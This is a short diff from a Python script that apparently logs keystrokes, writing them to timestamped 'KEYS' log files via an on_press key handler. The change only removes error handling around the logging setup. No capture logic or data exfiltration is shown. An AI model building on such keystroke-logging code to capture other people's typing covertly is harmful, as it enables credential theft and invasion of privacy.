@@ -7,12 +7,8 @@ is_logging = True
 current_time = datetime.now().strftime("%Y%m%d-%H%M%S")
 log_dir = Path("logs/KEYS-" + current_time + ".txt")
 
-print(log_dir)
-try:
-    logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-    print("Logging started")
-except: 
-    print("Error found")
+logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+print("Logging started")
 
 def on_press(key):
     global is_logging
